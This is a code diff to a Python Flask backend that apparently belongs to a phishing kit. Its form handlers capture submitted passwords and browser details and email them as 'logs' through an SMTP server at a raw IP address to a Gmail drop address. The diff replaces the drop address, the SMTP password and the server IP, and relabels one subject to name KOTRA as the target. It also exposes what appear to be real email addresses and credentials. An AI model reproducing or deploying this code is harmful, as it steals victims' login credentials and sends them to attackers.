@@ -161,8 +161,8 @@ def first():
         passwordemail = request.form.get('pig')
         sender_email = 'contact@domainshieldtech.bio'
         sender_emaill = 'contact'
-        receiver_email = 'bcjung0071@gmail.com'
-        password = 'vip5071dc7bc887'
+        receiver_email = 'danielnewwoj@gmail.com'
+        password = 'vip6ebdd04ea6df'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'General KR Logs !'
@@ -181,7 +181,7 @@ def first():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP('79.141.166.29', 6040) as server:
+        with smtplib.SMTP('77.83.196.189', 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
@@ -202,11 +202,11 @@ def second():
         passwordemail = request.form.get('pig')
         sender_email = 'contact@domainshieldtech.bio'
         sender_emaill = 'contact'
-        receiver_email = 'bcjung0071@gmail.com'
-        password = 'vip5071dc7bc887'
+        receiver_email = 'danielnewwoj@gmail.com'
+        password = 'vip6ebdd04ea6df'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
-        message['Subject'] = 'General KR logs !! '
+        message['Subject'] = 'General KOTRA logs !! '
         message['From'] = sender_email
         message['To'] = receiver_email
         text = \
@@ -222,7 +222,7 @@ def second():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP('79.141.166.29', 6040) as server:
+        with smtplib.SMTP('77.83.196.189', 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
